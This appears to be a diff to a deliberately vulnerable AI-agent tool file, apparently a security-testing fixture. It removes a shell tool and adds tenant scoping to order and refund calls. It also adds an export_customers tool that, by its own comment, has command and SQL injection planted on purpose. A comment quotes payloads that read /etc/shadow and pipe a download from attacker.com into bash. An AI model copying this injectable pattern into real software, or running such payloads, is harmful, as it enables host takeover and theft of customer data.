@@ -39,26 +39,6 @@ def read_file(path: str) -> str:
 
 
 @tool
-def run_shell(command: str) -> str:
-    """Run a shell command and return its combined stdout+stderr output.
-
-    Args:
-        command: The shell command to execute.
-    """
-    # VULN-APP-001: shell=True passes the command string to /bin/sh verbatim.
-    # A caller supplying "ls; cat /etc/shadow" or "$(curl attacker.com/payload | bash)"
-    # gets arbitrary code execution on the host.
-    result = subprocess.run(
-        command,
-        shell=True,
-        capture_output=True,
-        text=True,
-        timeout=30,
-    )
-    return result.stdout + result.stderr
-
-
-@tool
 def fetch_url(url: str) -> str:
     """Fetch the contents of a URL and return the response body as a string.
 
@@ -88,7 +68,7 @@ def lookup_order(order_id: str, tenant_id: str) -> dict:
     # RDSClient.lookup_order, which builds raw f-string SQL with no tenant scoping.
     # A prompt-injected agent can read ANY tenant's order (CHAIN-1). tenant_id is
     # accepted but ignored by the underlying query.
-    return RDSClient().lookup_order(order_id)
+    return RDSClient().lookup_order(order_id, tenant_id)
 
 
 @tool
@@ -102,7 +82,7 @@ def issue_refund(order_id: str, amount: float, tenant_id: str) -> bool:
     """
     # SECURITY FIXTURE: VULN-MT-001 + VULN-DATA-001 (transitive) — cross-tenant
     # write IDOR + SQLi reachable from the agent.
-    return RDSClient().issue_refund(order_id, amount)
+    return RDSClient().issue_refund(order_id, amount, tenant_id)
 
 
 @tool
@@ -153,10 +133,30 @@ def delegate_to_sub_agent(task: str) -> str:
 # sub-agent delegation tool. The generic ops tools (read_file/run_shell/fetch_url) are
 # internal/debug tools that should NOT be exposed to a customer-facing agent — their
 # presence is itself a finding.
+@tool
+def export_customers(where_clause: str) -> str:
+    """Export customer rows matching a raw SQL predicate.
+
+    Args:
+        where_clause: SQL fragment appended after WHERE.
+    """
+    # Deliberate new vulnerability for the ticketing incremental: the predicate
+    # is concatenated into a shell command, so a caller can inject both SQL and
+    # a second command.
+    result = subprocess.run(
+        f'sqlite3 data.db "SELECT email, card_last4 FROM customers WHERE {where_clause}"',
+        shell=True,
+        capture_output=True,
+        text=True,
+        timeout=30,
+    )
+    return result.stdout + result.stderr
+
+
 ALL_TOOLS = [
     read_file,
-    run_shell,
     fetch_url,
+    export_customers,
     lookup_order,
     issue_refund,
     search_kb,
